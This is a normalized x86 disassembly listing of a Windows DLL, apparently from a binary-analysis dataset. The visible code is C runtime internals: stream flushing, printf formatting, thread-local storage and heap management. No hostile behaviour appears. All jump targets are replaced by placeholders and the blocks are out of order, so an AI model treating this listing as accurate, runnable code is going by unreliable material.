push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_10009ed8
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_1000a10c
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_10009ed8
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_1000a0c8
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_10009e00
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_10005f2d
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_1000664e ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000670c
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000670c
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_1000666e
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_1000666e
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_10006719
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000670c
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000670c
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_1000670c
pop ecx
xor edx edx
call sub_1000670c
pop ecx
jmp r-xdata
call sub_1000670c
pop ecx
movzx eax ax
jmp r-xdata
call sub_1000670c
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_10009230
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_1000670c
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_10006729
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_1000a135
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000670c
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_1000a270
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_1000a200
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_100066d4
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_100066a3
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_100066d4
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_100066a3
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_100066a3
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_100066d4
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_1000a135
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_1000666e
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_10005e15
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_100066a3
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_1000666e
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_100066d4
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_1000666e
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_10006737
push esi
call sub_10006974
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_10008e74
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_100067a9
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_100067bc
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_10008e74
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_100047cc
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_100067a9
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10006823
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_1000413e
pop ecx
push 0x0
push [ rw-data ]
call [ TlsSetValue@IAT ]
pop esi
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_1000413e
pop ecx
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_1000413e
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1000413e
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1000413e
pop ecx
mov eax [ esi + 0x50 ]
cmp eax rw-data
je r-xdata
push eax
call sub_1000413e
pop ecx
push esi
call sub_1000413e
pop ecx
push eax
call sub_1000413e
pop ecx
sub_100068c3
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_10006a7f
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_100068ff
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push ebp
mov ebp [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call ebp
push [ rw-data ]
call [ HeapDestroy@IAT ]
pop ebp
pop ebx
retn
mov eax [ rw-data ]
push esi
push edi
mov edi [ VirtualFree@IAT ]
lea esi [ eax + 0xc ]
push 0x4000
push 0x100000
push [ esi ]
call edi
push 0x8000
push 0x0
push [ esi ]
call edi
push [ esi + 0x4 ]
push 0x0
push [ rw-data ]
call ebp
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop edi
pop esi
sub_1000699d
push esi
push edi
mov edi [ DeleteCriticalSection@IAT ]
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
pop edi
pop esi
retn
cmp esi rw-data
je r-xdata
cmp esi rw-data
je r-xdata
cmp esi rw-data
je r-xdata
push eax
call edi
push [ esi ]
call sub_1000413e
pop ecx
sub_10006a09
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_100049d2
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_10006a09
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_100047cc
pop ecx
call sub_1000413e
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_10006a6a
pop ecx
pop edi
sub_10006a7f
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_10006abd
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_10006ae8
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_10005ae0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_10006e13
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
